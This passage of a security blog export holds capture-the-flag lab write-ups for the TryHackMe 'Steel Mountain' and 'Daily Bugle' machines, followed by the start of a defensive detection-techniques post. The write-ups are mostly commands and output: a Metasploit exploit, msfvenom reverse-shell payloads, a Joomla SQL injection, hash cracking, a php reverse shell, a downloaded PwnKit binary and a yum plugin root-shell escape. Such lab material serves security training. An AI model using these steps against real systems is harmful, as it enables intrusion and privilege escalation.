and Windows 8. References: https://nvd.nist.gov/vuln/detail/CVE-2014-6287 OSVDB (111386) https://seclists.org/bugtraq/2014/Sep/85 http://www.rejetto.com/wiki/index.php?title=HFS:_scripting_commands We will set all the required options.\nset rhost 10.10.70.179 set rport 8080 set lhost tun0 Run the exploit.\nexploit msf6 exploit(windows/http/rejetto_hfs_exec) \u0026gt; exploit [*] Started reverse TCP handler on 10.6.10.164:4444 [*] Using URL: http://10.6.10.164:8080/okBb9lTf [*] Server started. [*] Sending a malicious request to / [*] Payload request received: /okBb9lTf [*] Sending stage (175686 bytes) to 10.10.70.179 [!] Tried to delete %TEMP%\\cGZQGuu.vbs, unknown result [*] Meterpreter session 1 opened (10.6.10.164:4444 -\u0026gt; 10.10.70.179:63844) at 2024-05-23 23:14:00 -0400 [*] Server stopped. meterpreter \u0026gt; sysinfo Computer : STEELMOUNTAIN OS : Windows Server 2012 R2 (6.3 Build 9600). Architecture : x64 System Language : en_US Domain : WORKGROUP Logged On Users : 1 Meterpreter : x86/windows meterpreter \u0026gt; We got the meterpreter reverse shell and we can read the user flag.\nmeterpreter \u0026gt; shell Process 1056 created. Channel 2 created. Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\u0026gt;cd C:\\Users\\Bill\\Desktop cd c:\\users\\bill\\desktop c:\\Users\\bill\\Desktop\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is 2E4A-906A Directory of c:\\Users\\bill\\Desktop 09/27/2019 09:08 AM \u0026lt;DIR\u0026gt; . 09/27/2019 09:08 AM \u0026lt;DIR\u0026gt; .. 09/27/2019 05:42 AM 70 user.txt 1 File(s) 70 bytes 2 Dir(s) 44,155,789,312 bytes free c:\\Users\\bill\\Desktop\u0026gt; Privilege Escalation # Now, we will elevate our privileges. We will download the powershell script which can find common Windows privilege escalation vectors that rely on misconfigurations in the target. We will first download the script to our machine.\nLet\u0026rsquo;s upload it to the target.\nupload powerup.ps1 meterpreter \u0026gt; upload powerup.ps1 [*] Uploading : /root/tryhackme/powerup.ps1 -\u0026gt; powerup.ps1 [*] Uploaded 483.26 KiB of 483.26 KiB (100.0%): /root/tryhackme/powerup.ps1 -\u0026gt; powerup.ps1 [*] Completed : /root/tryhackme/powerup.ps1 -\u0026gt; powerup.ps1 meterpreter \u0026gt; load powershell Loading extension powershell...Success. meterpreter \u0026gt; powershell_shell PS \u0026gt; dir Directory: C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup Mode LastWriteTime Length Name ---- ------------- ------ ---- d---- 5/23/2024 8:13 PM %TEMP% -a--- 2/16/2014 12:58 PM 760320 hfs.exe -a--- 5/23/2024 8:19 PM 494860 powerup.ps1 PS \u0026gt; Load the powershell module and use powershell.\nload powershell powershell_shell Run the script PowerUp.ps1 that we just downloaded into the target and run it.\n. .\\powerup.ps1 We will now run all the checks in this module using the following command.\nInvoke-AllChecks PS \u0026gt; . .\\powerup.ps1 PS \u0026gt; Invoke-AllChecks [*] Running Invoke-AllChecks [*] Checking if user is in a local group with administrative privileges... [*] Checking for unquoted service paths... ServiceName : AdvancedSystemCareService9 Path : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;AdvancedSystemCareService9\u0026#39; -Path \u0026lt;HijackPath\u0026gt; ServiceName : AWSLiteAgent Path : C:\\Program Files\\Amazon\\XenTools\\LiteAgent.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;AWSLiteAgent\u0026#39; -Path \u0026lt;HijackPath\u0026gt; ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;IObitUnSvr\u0026#39; -Path \u0026lt;HijackPath\u0026gt; ServiceName : LiveUpdateSvc Path : C:\\Program Files (x86)\\IObit\\LiveUpdate\\LiveUpdate.exe StartName : LocalSystem AbuseFunction : Write-ServiceBinary -ServiceName \u0026#39;LiveUpdateSvc\u0026#39; -Path \u0026lt;HijackPath\u0026gt; [*] Checking service executable and argument permissions... ServiceName : IObitUnSvr Path : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe ModifiableFile : C:\\Program Files (x86)\\IObit\\IObit Uninstaller\\IUService.exe StartName : LocalSystem AbuseFunction : Install-ServiceBinary -ServiceName \u0026#39;IObitUnSvr\u0026#39; [*] Checking service permissions... [*] Checking %PATH% for potentially hijackable .dll locations... HijackablePath : C:\\Windows\\system32\\ AbuseFunction : Write-HijackDll -OutputFile \u0026#39;C:\\Windows\\system32\\\\wlbsctrl.dll\u0026#39; -Command \u0026#39;...\u0026#39; HijackablePath : C:\\Windows\\ AbuseFunction : Write-HijackDll -OutputFile \u0026#39;C:\\Windows\\\\wlbsctrl.dll\u0026#39; -Command \u0026#39;...\u0026#39; HijackablePath : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ AbuseFunction : Write-HijackDll -OutputFile \u0026#39;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\\\wlbsctrl.dll\u0026#39; -Command \u0026#39;...\u0026#39; When we run the command, we can see that there is a unquoted service path vulnerability as we can see it in the checks. More information on unquoted service path vulnerability can be found here.\n❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.70.179 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of exe-service file: 15872 bytes Saved as: Advanced.exe For the service AdvancedSystemCareService9, the CanRestart option is set to true which means that the service can be restarted. We will now create a malicious file and upload it in the IObit folder and then restart the service to get the reverse shell. The file name is set to Advanced because we are uploading the file into the path where the Advanced SystemCare folder is present as we know there is an unquoted service path vulnerability. Since the service AdvancedSystemCareService9 is running as system32, we will be getting a reverse shell as system32.\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.2.217 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe Exit the powershell. Using the earlier meterpreter reverse shell, change directory to the path IObit and then upload the malicious file that we created.\nupload Advanced.exe meterpreter \u0026gt; ls Listing: C:\\Users\\bill\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup ==================================================================================== Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 040777/rwxrwxrwx 0 dir 2024-05-23 23:26:39 -0400 %TEMP% 100777/rwxrwxrwx 15872 fil 2024-05-23 23:27:14 -0400 Advanced.exe 100666/rw-rw-rw- 10178 fil 2024-05-23 23:23:18 -0400 Invoke-AllChecks 100666/rw-rw-rw- 174 fil 2019-09-27 07:07:07 -0400 desktop.ini 100777/rwxrwxrwx 760320 fil 2014-02-16 15:58:52 -0500 hfs.exe 100666/rw-rw-rw- 494860 fil 2024-05-23 23:19:57 -0400 powerup.ps1 Open another terminal and use netcat listener on port 4443 to get the reverse shell.\nnc -lnvp 4443 Now, load the command prompt shell using the command in the meterpreter shell.\nshell Restart the AdvancedSystemCareService9 service by using the following commands.\nsc stop AdvancedSystemCareService9 sc start AdvancedSystemCareService9 Now we get a reverse shell in the other terminal window running as system32!\n❯ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.6.29.149] from (UNKNOWN) [10.10.70.179] 49343 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C: \\Windows\\system32\u0026gt; "},{"id":5,"href":"/docs/TryHackMe/DailyBugle/","title":"Daily Bugle","section":"Try Hack Me","content":" Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.\nhttps://tryhackme.com/r/room/dailybugle\nScanning # Let\u0026rsquo;s begin by scanning the target.\n(root㉿kali)-[~/tryhackme] └─# rustscan -a 10.10.59.64 -r 1-65535 --ulimit 5000 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- 0day was here ♥ [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.59.64:22 Open 10.10.59.64:80 Open 10.10.59.64:3306 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.59.64 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 23:05 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed Initiating Ping Scan at 23:05 Scanning 10.10.59.64 [4 ports] Completed Ping Scan at 23:05, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 23:05 Completed Parallel DNS resolution of 1 host. at 23:05, 0.06s elapsed DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 23:05 Scanning 10.10.59.64 [3 ports] Discovered open port 22/tcp on 10.10.59.64 Discovered open port 80/tcp on 10.10.59.64 Discovered open port 3306/tcp on 10.10.59.64 Completed SYN Stealth Scan at 23:05, 0.13s elapsed (3 total ports) Initiating Service scan at 23:05 Scanning 3 services on 10.10.59.64 Completed Service scan at 23:06, 16.47s elapsed (3 services on 1 host) NSE: Script scanning 10.10.59.64. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:06 NSE Timing: About 98.57% done; ETC: 23:06 (0:00:00 remaining) NSE Timing: About 99.76% done; ETC: 23:07 (0:00:00 remaining) Completed NSE at 23:07, 67.89s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 7.52s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed Nmap scan report for 10.10.59.64 Host is up, received echo-reply ttl 61 (0.092s latency). Scanned at 2023-03-19 23:05:49 EDT for 92s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 68ed7b197fed14e618986dc58830aae9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbp89KqmXj7Xx84uhisjiT7pGPYepXVTr4MnPu1P4fnlWzevm6BjeQgDBnoRVhddsjHhI1k+xdnahjcv6kykfT3mSeljfy+jRc+2ejMB95oK2AGycavgOfF4FLPYtd5J97WqRmu2ZC2sQUvbGMUsrNaKLAVdWRIqO5OO07WIGtr3c2ZsM417TTcTsSh1Cjhx3F+gbgi0BbBAN3sQqySa91AFruPA+m0R9JnDX5rzXmhWwzAM1Y8R72c4XKXRXdQT9szyyEiEwaXyT0p6XiaaDyxT2WMXTZEBSUKOHUQiUhX7JjBaeVvuX4ITG+W8zpZ6uXUrUySytuzMXlPyfMBy8B | 256 5cd682dab219e33799fb96820870ee9d (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKb+wNoVp40Na4/Ycep7p++QQiOmDvP550H86ivDdM/7XF9mqOfdhWK0rrvkwq9EDZqibDZr3vL8MtwuMVV5Src= | 256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP4TcvlwCGpiawPyNCkuXTK5CCpat+Bv8LycyNdiTJHX 80/tcp open http syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.6.40) | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ 3306/tcp open mysql syn-ack ttl 61 MariaDB (unauthorized) NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 92.57 seconds Raw packets sent: 7 (284B) | Rcvd: 4 (160B) Enumeration # We can see three open ports 22, 80 and 3306. There\u0026rsquo;s a website hosted on port 80, mysql service on port 3306 and SSH on port 22.\nLet\u0026rsquo;s navigate to the website that\u0026rsquo;s hosted on port 80. There\u0026rsquo;s Daily Bugle and it says that Spider-Man robs bank.\nFrom the scan results, we found that there are some disallowed entries in robots.txt. Let\u0026rsquo;s navigate to robots.txt and see if we can find any useful paths.\n# If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # http://www.robotstxt.org/orig.html # # For syntax checking, see: # http://tool.motoricerca.info/robots-checker.phtml User-agent: * Disallow: /administrator/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/ The /administrator/ leads to a Joomla login page. Let\u0026rsquo;s try to find the version of Joomla.\nA simple google search gave the path /administrator/manifests/files/joomla.xml where the Joomla version can be found.\nhttps://www.zyxware.com/articles/5532/how-to-know-the-version-of-joomla-site-without-admin-access\nThis XML file does not appear to have any style information associated with it. The document tree is shown below. \u0026lt;extension version=\u0026#34;3.6\u0026#34; type=\u0026#34;file\u0026#34; method=\u0026#34;upgrade\u0026#34;\u0026gt; \u0026lt;name\u0026gt;files_joomla\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;Joomla! Project\u0026lt;/author\u0026gt; \u0026lt;authorEmail\u0026gt;admin@joomla.org\u0026lt;/authorEmail\u0026gt; \u0026lt;authorUrl\u0026gt;www.joomla.org\u0026lt;/authorUrl\u0026gt; \u0026lt;copyright\u0026gt; (C) 2005 - 2017 Open Source Matters. All rights reserved \u0026lt;/copyright\u0026gt; \u0026lt;license\u0026gt; GNU General Public License version 2 or later; see LICENSE.txt \u0026lt;/license\u0026gt; \u0026lt;version\u0026gt;3.7.0\u0026lt;/version\u0026gt; \u0026lt;creationDate\u0026gt;April 2017\u0026lt;/creationDate\u0026gt; \u0026lt;description\u0026gt;FILES_JOOMLA_XML_DESCRIPTION\u0026lt;/description\u0026gt; \u0026lt;scriptfile\u0026gt;administrator/components/com_admin/script.php\u0026lt;/scriptfile\u0026gt; \u0026lt;update\u0026gt; \u0026lt;schemas\u0026gt; \u0026lt;schemapath type=\u0026#34;mysql\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/mysql \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;sqlsrv\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/sqlazure \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;sqlazure\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/sqlazure \u0026lt;/schemapath\u0026gt; \u0026lt;schemapath type=\u0026#34;postgresql\u0026#34;\u0026gt; administrator/components/com_admin/sql/updates/postgresql \u0026lt;/schemapath\u0026gt; \u0026lt;/schemas\u0026gt; \u0026lt;/update\u0026gt; \u0026lt;fileset\u0026gt; \u0026lt;files\u0026gt; \u0026lt;folder\u0026gt;administrator\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;bin\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;cache\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;cli\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;components\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;images\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;includes\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;language\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;layouts\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;libraries\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;media\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;modules\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;plugins\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;templates\u0026lt;/folder\u0026gt; \u0026lt;folder\u0026gt;tmp\u0026lt;/folder\u0026gt; \u0026lt;file\u0026gt;htaccess.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;web.config.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;LICENSE.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;README.txt\u0026lt;/file\u0026gt; \u0026lt;file\u0026gt;index.php\u0026lt;/file\u0026gt; \u0026lt;/files\u0026gt; \u0026lt;/fileset\u0026gt; \u0026lt;updateservers\u0026gt; \u0026lt;server name=\u0026#34;Joomla! Core\u0026#34; type=\u0026#34;collection\u0026#34;\u0026gt;https://update.joomla.org/core/list.xml\u0026lt;/server\u0026gt; \u0026lt;/updateservers\u0026gt; \u0026lt;/extension\u0026gt; Upon checking the vulnerabilities for the Joomla 3.7, there is an SQL Injection vulnerability present in Joomla 3.7.x before 3.7.1.\nhttps://www.cvedetails.com/cve/CVE-2017-8917/\nExploitation # There is a python code available to exploit this vulnerability.\nhttps://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py\n┌──(root㉿kali)-[~/tryhackme] └─# ./joomblah.py http://10.10.59.64/ .---. .-\u0026#39;\u0026#39;\u0026#39;-. .-\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39; _ \\ \u0026#39; _ \\ .---. \u0026#39;---\u0026#39; / /` \u0026#39;. \\ / /` \u0026#39;. \\ __ __ ___ /| | | . .---.. | \\ \u0026#39; . | \\ \u0026#39; | |/ `.\u0026#39; `. || | | .\u0026#39;| | || \u0026#39; | \u0026#39;| \u0026#39; | \u0026#39;| .-. .-. \u0026#39;|| | | \u0026lt; | | |\\ \\ / / \\ \\ / / | | | | | ||| __ | | __ | | | | `. ` ..\u0026#39; / `. ` ..\u0026#39; / | | | | | |||/\u0026#39;__ \u0026#39;. | | .:--.\u0026#39;. | | .\u0026#39;\u0026#39;\u0026#39;-. | | \u0026#39;-...-\u0026#39;` \u0026#39;-...-\u0026#39;` | | | | | ||:/` \u0026#39;. \u0026#39;| |/ | \\ | | |/.\u0026#39;\u0026#39;\u0026#39;. \\ | | | | | | | ||| | || |`\u0026#34; __ | | | / | | | | |__| |__| |__|||\\ / \u0026#39;| | .\u0026#39;.\u0026#39;\u0026#39;| | | | | | __.\u0026#39; \u0026#39; |/\u0026#39;..\u0026#39; / \u0026#39;---\u0026#39;/ / | |_| | | | | \u0026#39; \u0026#39; `\u0026#39;-\u0026#39;` \\ \\._,\\ \u0026#39;/| \u0026#39;. | \u0026#39;. |____.\u0026#39; `--\u0026#39; `\u0026#34; \u0026#39;---\u0026#39; \u0026#39;---\u0026#39; [-] Fetching CSRF token [-] Testing SQLi - Found table: fb9j5_users - Extracting users from fb9j5_users [$] Found user [\u0026#39;811\u0026#39;, \u0026#39;Super User\u0026#39;, \u0026#39;jonah\u0026#39;, \u0026#39;jonah@tryhackme.com\u0026#39;, \u0026#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;\u0026#39;] - Extracting sessions from fb9j5_session We found a user jonah with a password hash. Let\u0026rsquo;s crack the hash using John The Ripper. It takes quite some time to crack the password.\n┌──(root㉿kali)-[~/tryhackme] └─# cat hash.txt $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm ┌──(root㉿kali)-[~/tryhackme] └─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X2]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 3 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status spiderman123 (?) 1g 0:00:08:37 DONE (2023-03-20 01:18) 0.001933g/s 90.54p/s 90.54c/s 90.54C/s sweetsmile..speciala Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Let\u0026rsquo;s login to Joomla using the credentials jonah and spiderman123.\nUpon navigating to the templates section and clicking on templates, we can see the templates that are being used. In each template, we can see some php files. Let\u0026rsquo;s try to get a php reverse shell using those. Navigate to index.php file in protostar template and replace the code with the following php code.\nhttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php\nMake sure to change the ip address in the php file.\nStart the netcat listener and navigate to main website that\u0026rsquo;s being hosted on port 80.\n┌──(root㉿kali)-[~/tools] └─# nc -lnvp 1234 listening on [any] 1234 ... connect to [10.6.10.164] from (UNKNOWN) [10.10.59.64] 48864 Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 01:46:50 up 34 min, 0 users, load average: 0.00, 0.01, 0.05 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=48(apache) gid=48(apache) groups=48(apache) sh: no job control in this shell sh-4.2$ We get a foothold on the machine.\nPrivilege Escalation # Method 1 # Use the PwnKit exploit to get root privileges.\nhttps://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit\nDownload the binary to host machine and serve it using python http web server. Then download the binary to the target machine\u0026rsquo;s /tmp directory, change the permissions to executable and run it.\npython -m http.server sh-4.2$ wget http://10.6.10.164:8000/PwnKit wget http://10.6.10.164:8000/PwnKit --2023-03-20 02:01:32-- http://10.6.10.164:8000/PwnKit Connecting to 10.6.10.164:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 18040 (18K) [application/octet-stream] Saving to: \u0026#39;PwnKit\u0026#39; 100%[======================================\u0026gt;] 18,040 --.-K/s in 0.09s 2023-03-20 02:01:32 (189 KB/s) - \u0026#39;PwnKit\u0026#39; saved [18040/18040] sh-4.2$ chmod +x PwnKit chmod +x PwnKit sh-4.2$ ./PwnKit ./PwnKit [root@dailybugle tmp]# id id uid=0(root) gid=0(root) groups=0(root),48(apache) [root@dailybugle tmp]# We are root!!!\nMethod 2 # Download linpeas.sh to the target machine and run it.\nsh-4.2$ cd /tmp cd /tmp sh-4.2$ wget http://10.6.10.164:8000/linpeas.sh wget http://10.6.10.164:8000/linpeas.sh --2023-03-20 02:18:45-- http://10.6.10.164:8000/linpeas.sh Connecting to 10.6.10.164:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 828172 (809K) [text/x-sh] Saving to: \u0026#39;linpeas.sh\u0026#39; 0K .......... .......... .......... .......... .......... 6% 260K 3s 50K .......... .......... .......... .......... .......... 12% 554K 2s 100K .......... .......... .......... .......... .......... 18% 2.42M 1s 150K .......... .......... .......... .......... .......... 24% 665K 1s 200K .......... .......... .......... .......... .......... 30% 1.76M 1s 250K .......... .......... .......... .......... .......... 37% 7.66M 1s 300K .......... .......... .......... .......... .......... 43% 7.49M 1s 350K .......... .......... .......... .......... .......... 49% 971K 0s 400K .......... .......... .......... .......... .......... 55% 3.86M 0s 450K .......... .......... .......... .......... .......... 61% 2.12M 0s 500K .......... .......... .......... .......... .......... 68% 9.80M 0s 550K .......... .......... .......... .......... .......... 74% 13.5M 0s 600K .......... .......... .......... .......... .......... 80% 3.34M 0s 650K .......... .......... .......... .......... .......... 86% 1.07M 0s 700K .......... .......... .......... .......... .......... 92% 8.62M 0s 750K .......... .......... .......... .......... .......... 98% 2.25M 0s 800K ........ 100% 65.8M=0.6s 2023-03-20 02:18:45 (1.31 MB/s) - \u0026#39;linpeas.sh\u0026#39; saved [828172/828172] sh-4.2$ chmod +x linpeas.sh chmod +x linpeas.sh sh-4.2$ ./linpeas.sh We found a public password in php config files.\n╔══════════╣ Searching passwords in config PHP files public $password = \u0026#39;nv5uz9r3ZEDzVjNu\u0026#39;; $this-\u0026gt;password = (empty($this-\u0026gt;options[\u0026#39;db_pass\u0026#39;])) ? \u0026#39;\u0026#39; : $this-\u0026gt;options[\u0026#39;db_pass\u0026#39;]; $this-\u0026gt;password = null; \u0026#39;password\u0026#39; =\u0026gt; $this-\u0026gt;password, Let\u0026rsquo;s try this password to switch the user from apache to jjameson.\nsh-4.2$ su jjameson su jjameson Password: nv5uz9r3ZEDzVjNu id uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson) whoami jjameson It worked. We successfully changed to the user jjameson.\nNow, let\u0026rsquo;s see what binaries can be run using sudo.\nsudo -l Matching Defaults entries for jjameson on dailybugle: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=\u0026#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\u0026#34;, env_keep+=\u0026#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\u0026#34;, env_keep+=\u0026#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\u0026#34;, env_keep+=\u0026#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\u0026#34;, env_keep+=\u0026#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\u0026#34;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User jjameson may run the following commands on dailybugle: (ALL) NOPASSWD: /usr/bin/yum The user jjameson can run the binary yum with root privileges.\nNavigate to GTFO bins.\nhttps://gtfobins.github.io/gtfobins/yum/#sudo\nWe can spawn an interactive root shell by loading a custom plugin as follows.\nid uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson) whoami jjameson TF=$(mktemp -d) cat \u0026gt;$TF/x\u0026lt;\u0026lt;EOF [main] plugins=1 pluginpath=$TF pluginconfpath=$TF EOF cat \u0026gt;$TF/y.conf\u0026lt;\u0026lt;EOF [main] enabled=1 EOF cat \u0026gt;$TF/y.py\u0026lt;\u0026lt;EOF import os import yum from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version=\u0026#39;2.1\u0026#39; def init_hook(conduit): os.execl(\u0026#39;/bin/sh\u0026#39;,\u0026#39;/bin/sh\u0026#39;) EOF sudo yum -c $TF/x --enableplugin=y Loaded plugins: y No plugin match for: y id uid=0(root) gid=0(root) groups=0(root) whoami root We are root!!!\n"},{"id":6,"href":"/posts/DetectionTechniques/","title":"Detection Techniques","section":"Blog","content":" Based on Cyber Kill Chain # 1. Reconnaissance # Hunting for Open Ports using PowerShell: Technique: Attackers scan for open ports as initial reconnaissance to discover services they can exploit. Detection: Develop scripts to log and analyze port scanning activities and alert on anomalies compared to baseline port usage. Response: Block or limit access to unused ports, implement network segmentation, and regularly audit network services. Hunting Network Connections: Technique: Monitoring connections can reveal attempts to reach known bad domains or unusual external systems, indicating reconnaissance or data exfiltration attempts. Detection: Use network traffic analysis tools to flag new, unexpected, or unauthorized connections. Response: Block connections to known malicious IPs and domains, and implement network whitelisting. Hunting Metasploit: Technique: Using Metasploit for initial scanning and probing. Detection: Detect signatures of Metasploit payloads and modules in network traffic, and monitor for suspicious endpoint behavior that correlates with common Metasploit tactics. Response: Isolate and investigate systems showing signs of Metasploit activity, and update defenses to mitigate known Metasploit exploits. Hunting for Common Enumeration Techniques: Technique: Attackers use tools like Nmap and Nessus to enumerate network services and vulnerabilities. Detection: Monitor for high volumes of network traffic and unusual patterns indicative of enumeration tools. Response: Conduct regular internal vulnerability assessments to understand the attack surface and apply necessary patches. Hunting DNS Requests: Technique: Attackers often use DNS requests to resolve command and control servers or gather information about the network. Detection: Analyze DNS query logs for unusual domain lookups and patterns that deviate from normal behavior. Response: Block suspicious domains, implement DNS filtering solutions, and configure alerting for high-risk domain queries. Hunting Social Media and Public Data Leaks: Technique: Attackers gather information from social media profiles and public data sources. Detection: Monitor social media and public forums for mentions of your organization, and use digital risk protection services. Response: Educate employees on safe social media practices, and take down exposed sensitive information from public sites. OSINT Gathering: Technique: Collecting information from publicly available sources about the target organization. Detection: Monitor social media, public forums, and other platforms for mentions of the organization or key personnel. Response: Educate employees about the risks of oversharing information and implement policies to minimize exposure. DNS Reconnaissance: Technique: Querying DNS records to gather information about the target’s 